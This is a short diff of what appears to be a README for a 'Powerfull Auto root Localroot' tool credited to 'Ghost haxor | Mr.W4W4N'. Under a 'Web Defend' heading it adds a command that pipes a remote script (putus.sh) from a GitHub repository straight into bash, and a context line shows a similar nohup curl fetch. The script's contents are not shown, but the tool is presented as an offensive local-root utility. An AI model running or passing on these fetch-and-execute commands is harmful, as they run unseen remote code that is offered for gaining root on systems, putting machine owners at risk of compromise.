@@ -51,8 +51,7 @@ nohup curl -s https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main
 ```
 # Web Defend
 ```
-curl -o githubusercontent.com/peler.sh
-
+curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/putus.sh | bash
 ```
 
 ☠️ Powerfull Auto root Localroot By Ghost haxor | Mr.W4W4N ☠️
